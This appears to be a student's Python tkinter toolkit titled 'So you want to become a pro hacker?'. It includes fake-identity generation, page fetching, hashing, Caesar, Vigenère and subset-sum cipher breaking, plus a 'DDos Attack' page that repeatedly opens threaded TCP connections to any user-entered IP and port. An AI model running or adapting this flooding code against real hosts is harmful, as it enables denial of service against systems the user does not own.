# Hadas Goren

# Import the required libraries
import tkinter as tk
from tkinter import ttk
from faker import Faker
import requests
from cryptography.fernet import Fernet
import hashlib
import socket
import sys
import threading


# The apps main window - creating all needed frames
class MainApp(tk.Tk):
    # Creating the container - will hold all frames
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        container = tk.Frame(self)
        container.pack(side="top", fill="both", expand=True)
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)

        # Creating all frames - each function will reveal a new frame
        self.frames = {}
        for F in (MainPage, FakerPage, RequestsPage, EncryptPage, CipherPage, VigenerePage, MsspPage, DdosPage):
            pageName = F.__name__
            frame = F(parent=container, controller=self)
            frame.configure(background='black')
            self.frames[pageName] = frame
            self.state("zoomed")
            self.title("So you want to become a pro hacker?")
            frame.grid(row=0, column=0, sticky="nsew")
        self.showFrame("MainPage")

    # Function to raise the current relevant frame
    def showFrame(self, pageName):
        frame = self.frames[pageName]
        frame.tkraise()


class MainPage(tk.Frame):
    # First frame - main page
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller

        # Set Student names label
        namesLbl = tk.Label(self, text="Hadas Goren - 307916296, Elad Gishri- 201080231", bg='#000', fg='#18ff07', font=20)
        namesLbl.pack(side="top", padx=8, pady=8)
        # Set buttons
        fakerBtn = tk.Button(self, text="Generate Fake Details", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("FakerPage"))
        fakerBtn.pack(side="top", padx=8, pady=8)

        requestsLibBtn = tk.Button(self, text="Get source code and search a word in URL", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("RequestsPage"))
        requestsLibBtn.pack(side="top", padx=8, pady=8)

        encBtn = tk.Button(self, text="Encrypt String", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("EncryptPage"))
        encBtn.pack(side="top", padx=8, pady=8)

        cipherBtn = tk.Button(self, text="Attack Caesar Cipher", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("CipherPage"))
        cipherBtn.pack(side="top", padx=8, pady=8)

        vigenereBtn = tk.Button(self, text="Attack Vigenère Cipher", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("VigenerePage"))
        vigenereBtn.pack(side="top", padx=8, pady=8)

        msspBtn = tk.Button(self, text="Encrypt using MSSP", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("MsspPage"))
        msspBtn.pack(side="top", padx=8, pady=8)

        ddosBtn = tk.Button(self, text="DDos Attack", bg='#5F6963', fg='#18ff07', width=35, font=20, command=lambda: controller.showFrame("DdosPage"))
        ddosBtn.pack(side="top", padx=8, pady=8)


class FakerPage(tk.Frame):
    # Second page - User chooses a language to generate fake details
    languages = {}
    fakeDetails_box = None

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        # Create StringVar for the dropdown widget
        self.langList = ["English", "Italian", "Hebrew", "Japanese"]
        self.chosenLang = tk.StringVar(self)
        self.chosenLang.set("English")  # default value
        fakerDropDown = tk.OptionMenu(self, self.chosenLang, *self.langList, command=self.selectedLang)
        fakerDropDown.config(bg='#5F6963', fg='#18ff07', font=16)
        fakerDropDown.pack(side="top", padx=5, pady=5)
        mainButton = tk.Button(self, text="Back to start page", bg='#5F6963', fg='#18ff07', font=16, command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side='bottom', padx=5, pady=5)

    def selectedLang(self, *args):
        lang = self.chosenLang.get()
        # Create an instance of Faker with the required location
        match lang:
            case 'English':
                fake = Faker()
            case 'Italian':
                fake = Faker('it_IT')
            case 'Hebrew':
                fake = Faker('he_IL')
            case 'Japanese':
                fake = Faker('jp_JP')
            case default:
                return
        if self.fakeDetails_box is not None:
            self.fakeDetails_box.destroy()
        self.generateFakeDetails(fake)

    def generateFakeDetails(self, fakerObj):
        fakeDetails = 'Name:' + "\n" + fakerObj.name() + "\n\n" + 'Email:' + "\n" + fakerObj.email() + "\n\n" + 'URL:' + "\n" + fakerObj.url() + "\n\n" + 'Text:' + "\n" + fakerObj.text() + "\n\n" + 'Country:' + "\n" + fakerObj.country()
        self.fakeDetails_box = tk.Text(self, height=20, width=80, bg='#000', fg='#18ff07', font=16)
        self.fakeDetails_box.pack(expand=True, side='top', padx=5, pady=5)
        self.fakeDetails_box.insert('end', fakeDetails)
        self.fakeDetails_box.config(state='disabled')


class RequestsPage(tk.Frame):
    # Third page - User gives an url to get the page's source code and a word to look for in source code
    # Output will be the source code and an array of indices (where the word was found)
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.indices_box = None
        self.SourceCodeText = None
        self.sb = None
        self.controller = controller
        url_label = tk.Label(self, text='URL to search for:', font=20, bg='#000', fg='#18ff07')
        url_entry = tk.Entry(self, width=80)
        url_label.pack()
        url_entry.pack()
        word_label = tk.Label(self, text='Word to search for in source code:', font=20, bg='#000', fg='#18ff07')
        word_entry = tk.Entry(self)
        word_label.pack()
        word_entry.pack()
        goButton = tk.Button(self, text="Go!", bg='#5F6963', fg='#18ff07', font=20, command=lambda: self.urlRequest(url_entry.get(), word_entry.get()))
        goButton.pack(side="top", padx=5, pady=5)
        mainButton = tk.Button(self, text="Back to start page", font=20, bg='#5F6963', fg='#18ff07', command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side="bottom", padx=5, pady=5)

    def urlRequest(self, url, word):
        if url != '' and word != '':
            result = requests.get(url)
            resultText = result.text
            lst = []
            for i in range(0, len(resultText)):
                resultSub = resultText.find(word, i, i + (len(word)))
                if resultSub != -1:
                    lst.append(resultSub)
                    i = i + len(word)

            if self.indices_box and self.SourceCodeText is not None:
                self.indices_box.destroy()
                self.SourceCodeText.destroy()
                self.sb.destroy()

            indicesTxt = word + ' found at:' + '\n' + f'{lst}'
            self.indices_box = tk.Text(self, height=5, width=108, bg='#000', fg='#18ff07', font=10)
            self.indices_box.pack(expand=True, side='top')
            self.indices_box.insert('end', indicesTxt)
            self.indices_box.config(state='disabled')
            SourceCode = 'Source code:' + "\n\n" + resultText
            self.SourceCodeText = tk.Text(self, height=20, width=110, bg='#000', fg='#18ff07', font=10, wrap='word')
            self.SourceCodeText.pack(expand=True, side='left', pady=2)
            self.SourceCodeText.insert('end', SourceCode)
            self.SourceCodeText.config(state='disabled')
            self.sb = tk.Scrollbar(self)
            self.sb.pack(side='right', fill='both')
            self.SourceCodeText.config(yscrollcommand=self.sb.set)
            self.sb.config(command=self.SourceCodeText.yview)
        else:
            labelframe = ttk.LabelFrame(self, text="ERROR!")
            labelframe.pack(padx=30, pady=30)
            errorLabel = tk.Label(labelframe, text='Please do not leave the fields blank', font=20, bg='#000', fg='#FF0000')
            errorLabel.pack()


class EncryptPage(tk.Frame):
    # Third frame - User enters a string to encrypt and selects an encryption method
    # Output is the encrypted string
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.cipherTextShaLbl = None
        self.cipherTextFernetLbl = None
        self.controller = controller
        string_label = tk.Label(self, text='Enter string to encrypt: ', bg='#000', fg='#18ff07', font=16)
        string_entry = tk.Entry(self)
        string_label.pack()
        string_entry.pack()

        shaBtn = tk.Button(self, text="Use sha-256", bg='#5F6963', fg='#18ff07', font=20, command=lambda: self.hashSha256(string_entry.get()))
        shaBtn.pack(side='top', padx=5, pady=5)
        fernetBtn = tk.Button(self, text="Use fernet", bg='#5F6963', fg='#18ff07', font=20, command=lambda: self.hashFernet(string_entry.get()))
        fernetBtn.pack(side='top', padx=5, pady=5)
        mainButton = tk.Button(self, text="Back to start page", bg='#5F6963', fg='#18ff07', font=20, command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side="bottom", padx=5, pady=5)

    def hashSha256(self, string):
        if self.cipherTextShaLbl is not None:
            self.cipherTextShaLbl.destroy()
        sha_signature = hashlib.sha256(string.encode()).hexdigest()
        self.cipherTextShaLbl = tk.Label(self, text='\'' + string + '\' ' + 'encrypted using sha-256 is:  ' + "\n" + sha_signature, bg='#000', fg='#18ff07', font=16)
        self.cipherTextShaLbl.pack(side="top", padx=5, pady=5)

    def hashFernet(self, string):
        if self.cipherTextFernetLbl is not None:
            self.cipherTextFernetLbl.destroy()
        byteString = str.encode(string)
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)
        cipher_text = cipher_suite.encrypt(byteString)
        self.cipherTextFernetLbl = tk.Label(self, text='\'' + string + '\' ' + 'encrypted using Fernet is:  ' + "\n" + str(cipher_text), bg='#000', fg='#18ff07', font=16)
        self.cipherTextFernetLbl.pack(side="top", padx=5, pady=5)


class CipherPage(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.treeFrame = None
        self.controller = controller
        self.cipher2decryptLbl = tk.Label(self, text='Please enter cipher encrypted text in English: ', bg='#000', fg='#18ff07', font=16)
        self.cipher2decryptLbl.pack(side="top", padx=5, pady=5)
        cipher2decrypt_entry = tk.Entry(self)
        cipher2decrypt_entry.pack()
        goButton = tk.Button(self, text="Go!", bg='#5F6963', fg='#18ff07', font=16, command=lambda: self.decryptCipher(cipher2decrypt_entry.get()))
        goButton.pack(side="top", padx=5, pady=5)
        mainButton = tk.Button(self, text="Back to start page", bg='#5F6963', fg='#18ff07', font=16, command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side="bottom", padx=5, pady=5)

    def decryptCipher(self, text):
        if self.treeFrame is not None:
            self.treeFrame.destroy()
        self.treeFrame = tk.Frame(self)
        self.treeFrame.pack()
        cols = ('Key', 'Decrypted Text')
        tree = ttk.Treeview(self.treeFrame, columns=cols, show='headings', height=30)
        for col in cols:
            tree.heading(col, text=col)
        tree.column(0, width=30)
        tree_sb = tk.Scrollbar(self.treeFrame, orient='vertical')
        tree_sb.pack(side='right', fill="y")
        tree.config(yscrollcommand=tree_sb.set)
        tree_sb.config(command=tree.yview)

        for key in range(0, 26):
            result = ""
            # traverse text
            for i in range(len(text)):
                char = text[i]
                # Encrypt uppercase characters
                if char.isupper():
                    # chr is to turn int to char by ASCII table; ord is to do the opposite
                    # 26 letters in English alphabet; 65 ASCII value of 'A', 97 ASCII value of 'a'
                    result += chr((ord(char) - key - 65) % 26 + 65)
                    # Encrypt lowercase characters
                else:
                    result += chr((ord(char) - key - 97) % 26 + 97)
            tree.insert("", "end", values=(key, result))
            style = ttk.Style(self)
            style.theme_use("clam")
            style.configure("Treeview", background="black", fieldbackground="black", foreground='#18ff07')
            tree.pack()


class VigenerePage(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.treeFrame = None
        self.controller = controller
        self.vig2decryptLbl = tk.Label(self, text='Please enter vigenere encrypted text in English: ', bg='#000', fg='#18ff07', font=16)
        self.vig2decryptLbl.pack(side="top", padx=5, pady=5)
        self.vig2decryptInp = tk.Entry(self)
        self.vig2decryptInp.pack(side="top", padx=5, pady=5)
        goButton = tk.Button(self, text="Go!", bg='#5F6963', fg='#18ff07', font=16, command=lambda: self.decryptVigenere(self.vig2decryptInp.get()))
        goButton.pack(side="top", padx=5, pady=5)
        mainButton = tk.Button(self, text="Back to start page", bg='#5F6963', fg='#18ff07', font=16, command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side="bottom", padx=5, pady=5)

    def decryptVigenere(self, text):
        if self.treeFrame is not None:
            self.treeFrame.destroy()
        self.treeFrame = tk.Frame(self)
        self.treeFrame.pack()
        cols = ('Jump', 'Decrypted Text - Index of array cell = Key')
        tree = ttk.Treeview(self.treeFrame, columns=cols, show='headings', height=30)
        for col in cols:
            tree.heading(col, text=col)
        tree.column(0, width=50)
        tree.column(1, width=800)
        tree_sb = tk.Scrollbar(self.treeFrame, orient='vertical')
        tree_sb.pack(side='right', fill="y")
        tree.config(yscrollcommand=tree_sb.set)
        tree_sb.config(command=tree.yview)

        for jump in range(0, 26):
            results = []
            for key in range(0, 26):
                result = ""
                # traverse text
                for i in range(len(text)):
                    char = text[i]
                    # Encrypt uppercase characters
                    if char.isupper():
                        # chr is to turn int to char by ASCII table; ord is to do the opposite
                        # 26 letters in English alphabet; 65 ASCII value of 'A', 97 ASCII value of 'a'
                        result += chr((ord(char) - key - (jump * i) - 65) % 26 + 65)
                    # Encrypt lowercase characters
                    else:
                        result += chr((ord(char) - key - (jump * i) - 97) % 26 + 97)
                results.append(result)
            tree.insert("", "end", values=(jump, results))
            style = ttk.Style(self)
            style.theme_use("clam")
            style.configure("Treeview", background="black", fieldbackground="black", foreground='#18ff07')
            tree.pack()


class MsspPage(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.plainTxtLbl = None
        self.labelframe = None
        self.parentArray = []
        self.possibleSumsArr = []
        self.encryptedTxtLbl = tk.Label(self, text='Please enter encrypted Cypher text: ', bg='#000', fg='#18ff07', font=16)
        self.encryptedTxtLbl.pack(side="top", padx=5, pady=5)
        encryptedTxtInp = tk.Entry(self)
        encryptedTxtInp.pack()
        self.arrayNumLbl = tk.Label(self, text='You must enter at least 2 parameters, if you don\'t know 1 - enter \'0\': ', bg='#000', fg='#18ff07', font=16)
        self.arrayNumLbl.pack(side="top", padx=5, pady=5)
        self.arrayNumLbl = tk.Label(self, text='Please enter n - number of arrays: ', bg='#000', fg='#18ff07', font=16)
        self.arrayNumLbl.pack(side="top", padx=5, pady=5)
        arrayNumInp = tk.Entry(self)
        arrayNumInp.pack()
        self.elemNumLbl = tk.Label(self, text='Please enter m - number of elements in array: ', bg='#000', fg='#18ff07', font=16)
        self.elemNumLbl.pack(side="top", padx=5, pady=5)
        elemNumInp = tk.Entry(self)
        elemNumInp.pack()
        self.digitNumLbl = tk.Label(self, text='Please enter d - number of digits in numbers: ', bg='#000', fg='#18ff07', font=16)
        self.digitNumLbl.pack(side="top", padx=5, pady=5)
        digitNumInp = tk.Entry(self)
        digitNumInp.pack()
        goButton = tk.Button(self, text="Go!", bg='#5F6963', fg='#18ff07', font=16, command=lambda: self.findMatchingSum(int(arrayNumInp.get()), int(elemNumInp.get()), int(digitNumInp.get()), encryptedTxtInp.get()))
        goButton.pack(side="top", padx=5, pady=5)
        mainButton = tk.Button(self, text="Back to start page", bg='#5F6963', fg='#18ff07', command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side="top", padx=5, pady=5)

    def divide2Arrays(self, n, m, d, cypher):
        arrNum = n
        elemNum = m
        numLength = d
        startPosition = 0

        if n == 0 and m != 0 and d != 0:
            arrNum = (len(cypher) / numLength) / elemNum
        elif n != 0 and m != 0 and d == 0:
            numLength = (len(cypher) / arrNum) / elemNum
        elif n != 0 and m == 0 and d != 0:
            elemNum = (len(cypher) / arrNum) / numLength

        elemNum = int(elemNum)

        for i in range(int(arrNum)):
            res = []
            for idx in range(startPosition, startPosition+numLength*elemNum, numLength*elemNum):
                for dig in range(startPosition, startPosition+numLength*elemNum, numLength):
                    res.append(int(cypher[dig: dig + numLength]))
                startPosition += numLength*elemNum
            self.parentArray.append(res)

    def calcSubsetSum(self, nums, i, reqSum, strArr):
        res = False
        if reqSum == 0:
            res = True
        elif i >= len(nums):
            res = False
        else:
            res = self.calcSubsetSum(nums, i+1, reqSum-nums[i], strArr+str(nums[i]) + " ") or self.calcSubsetSum(nums, i+1, reqSum, strArr)
        return res

    def calcSubsetSumOver(self, arr):
        arrCopy = self.possibleSumsArr.copy()
        for optionSum in self.possibleSumsArr:
            if not self.calcSubsetSum(arr, 0, optionSum, ""):
                arrCopy.remove(optionSum)

        self.possibleSumsArr = arrCopy.copy()

    def subsetSums(self, arr):
        length = len(arr)
        total = 1 << length
        for i in range(total):
            Sum = 0
            for j in range(length):
                if i & (1 << j) != 0:
                    Sum += arr[j]
            if Sum != 0:
                self.possibleSumsArr.append(Sum)

    def findMatchingSum(self, n, m, d, cypher):
        if self.plainTxtLbl is not None:
            self.plainTxtLbl.destroy()
            self.possibleSumsArr = []
            self.parentArray = []
            if self.labelframe is not None:
                self.labelframe.destroy()

        if n == 0 and m == 0 and d == 0 or n == 0 and m == 0 or m == 0 and d == 0 or n == 0 and d == 0:
            labelframe = ttk.LabelFrame(self, text="ERROR!")
            labelframe.pack(padx=30, pady=30)
            errorLabel = tk.Label(labelframe, text='Invalid Input!', font=20, bg='#000', fg='#FF0000')
            errorLabel.pack()
            return
        self.divide2Arrays(n, m, d, cypher)
        self.subsetSums(self.parentArray[0])
        for idx in range(1, len(self.parentArray)):
            self.calcSubsetSumOver(self.parentArray[idx])
        self.plainTxtLbl = tk.Label(self, text='The original plaintext is: ' + str(self.possibleSumsArr), bg='#000', fg='#18ff07', font=16)
        self.plainTxtLbl.pack(side="top", padx=5, pady=5)


class DdosPage(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.ip = None
        self.port = None
        self.msg = None
        self.numOfThreads = None
        self.loops = None
        self.ddosLbl = None
        self.threads = []
        self.IpLbl = tk.Label(self, text='Enter ip (for localhost write localhost): ', bg='#000', fg='#18ff07', font=16)
        self.IpLbl.pack(side="top", padx=5, pady=5)
        self.IpInp = tk.Entry(self)
        self.IpInp.pack()
        self.portLbl = tk.Label(self, text='Enter port: ', bg='#000', fg='#18ff07', font=16)
        self.portLbl.pack(side="top", padx=5, pady=5)
        self.portInp = tk.Entry(self)
        self.portInp.pack()
        self.msgLbl = tk.Label(self, text='Enter message: ', bg='#000', fg='#18ff07', font=16)
        self.msgLbl.pack(side="top", padx=5, pady=5)
        self.msgInp = tk.Entry(self)
        self.msgInp.pack()
        self.threadLbl = tk.Label(self, text='Enter number of threads to initialize: ', bg='#000', fg='#18ff07', font=16)
        self.threadLbl.pack(side="top", padx=5, pady=5)
        self.threadInp = tk.Entry(self)
        self.threadInp.pack()
        self.loopLbl = tk.Label(self, text='Enter number of times to run all threads: ', bg='#000', fg='#18ff07', font=16)
        self.loopLbl.pack(side="top", padx=5, pady=5)
        self.loopInp = tk.Entry(self)
        self.loopInp.pack()
        goButton = tk.Button(self, text="Go!", bg='#5F6963', fg='#18ff07', font=16, command=lambda: self.checkConsole())
        goButton.pack(side="top", padx=5, pady=5)

        mainButton = tk.Button(self, text="Back to start page", bg='#5F6963', fg='#18ff07', command=lambda: controller.showFrame("MainPage"))
        mainButton.pack(side="top", padx=5, pady=5)

    def checkConsole(self):
        startProcess(self, self.IpInp.get(), int(self.portInp.get()), self.msgInp.get(), int(self.threadInp.get()), int(self.loopInp.get()))
        if self.ddosLbl is not None:
            self.ddosLbl.destroy()
        self.ddosLbl = tk.Label(self, text='Attack completed, check console ', bg='#000', fg='#18ff07', font=16)
        self.ddosLbl.pack(side="top", padx=5, pady=5)


def startProcess(self, ip, port, msg, numOfThreads, loops):
    self.ip = ip
    self.port = port
    self.msg = msg
    self.numOfThreads = numOfThreads
    self.loops = loops
    initThreads(self)
    runThreads(self)


def initThreads(self):
    for i in range(self.numOfThreads):
        thread = MyThread(i+1, "Thread"+str(i+1), self)
        thread.start()
        self.threads.append(thread)


def runThreads(self):
    i = 1
    while i < self.loops:
        # Start new Threads
        for j in range(len(self.threads)):
            self.threads[j].run()
        i += 1
    print("Exiting Main Thread")


def attack(self, ip, port, msg, thread_id):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    server_address = (ip, port)
    print(sys.stderr, 'connecting to %s port %s' % server_address)
    sock.connect(server_address)
    try:
        # Send data
        threadmsg = 'Thread-', thread_id, ':', msg
        message = str.encode(str(threadmsg))
        print(sys.stderr, 'thread-', thread_id, 'sending"%s"' % message)
        sock.sendall(message)
        # Look for the response
        amount_received = 0
        amount_expected = len(message)
        while amount_received < amount_expected:
            data = sock.recv(16)
            amount_received += len(data)
            print(sys.stderr, 'received "%s"' % data)
    finally:
        print(sys.stderr, 'closing socket')
        sock.close()


class MyThread(threading.Thread):
    def __init__(self, threadID, name, ddos):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.ddos = ddos

    def run(self):
        print("Starting " + self.name)
        attack(self, self.ddos.ip, self.ddos.port, self.ddos.msg, self.threadID)
        print("Exiting " + self.name)


if __name__ == "__main__":
    app = MainApp()
    app.mainloop()
